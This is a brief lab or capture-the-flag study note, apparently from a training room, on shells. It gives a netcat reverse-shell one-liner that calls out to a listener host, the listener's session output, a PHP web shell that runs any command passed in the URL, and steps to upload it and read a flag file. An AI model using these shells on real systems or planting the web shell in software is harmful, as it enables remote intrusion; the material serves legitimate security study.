# Shells Overview

<https://www.youtube.com/watch?v=I6Jm10TuBbg> Shells

## Reverse Shell

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.67.84.151
4444>/tmp/f

root@ip-10-67-84-151:~# nc -lvnp 4444 Listening on 0.0.0.0 4444 Connection
received on 10.67.132.79 32856 sh: 0: can't access tty; job control turned off $
ls hello.txt index.php style.css $ whoami www-data $ cd / $ ls bin boot dev etc
flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var $

## Web Shell

<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>

Upload it to the vulnearble directory

Navigae to the shell:

<http://10.67.132.79:8082/uploads/shell.php?cmd=cat%20/flag.txt>
